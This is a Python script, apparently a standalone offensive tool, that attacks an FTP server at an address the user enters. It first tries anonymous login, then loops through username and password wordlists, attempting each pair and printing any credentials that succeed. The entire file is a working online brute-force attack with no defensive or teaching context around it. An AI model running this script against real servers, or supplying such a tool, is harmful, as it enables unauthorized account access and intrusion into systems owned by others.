import ftplib
import multiprocessing

def brute_force(ip_address, user, password):
    ftp = ftplib.FTP(ip_address)
    try:
        print(f"Testing user {user}, password {password}")
        response = ftp.login(user, password)
        if "230" in response and "access granted" in response:
            print("[*] Successful brute force")
            print(f"User: {user} Password: {password}")
            return True
    except ftplib.all_errors as exception:
        pass
    finally:
        ftp.quit()
    return False

def check_anonymous_login(ip_address):
    try:
        ftp = ftplib.FTP(ip_address)
        response = ftp.login('anonymous', 'anonymous')
        print(response)
        if "230 Anonymous access granted" in response:
            print("[*] Anonymous login successful")
            return True
    except ftplib.all_errors as exception:
        print(str(exception))
        print('\n' + str(ip_address) + 'ftp Anonymous login failed')
    return False

def load_credentials(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def main():
    ip_address = input("Enter IP address or host name: ")
    
    # Check for anonymous login first
    if check_anonymous_login(ip_address):
        print("Anonymous login allowed, skipping further brute force attempts.")
        return
    
    # Load usernames and passwords from the curated lists
    users = load_credentials('usernames.txt')
    passwords = load_credentials('passwords.txt')
    
    for user in users:
        for password in passwords:
            process = multiprocessing.Process(target=brute_force, args=(ip_address, user, password))
            process.start()
            process.join()

if __name__ == '__main__':
    main()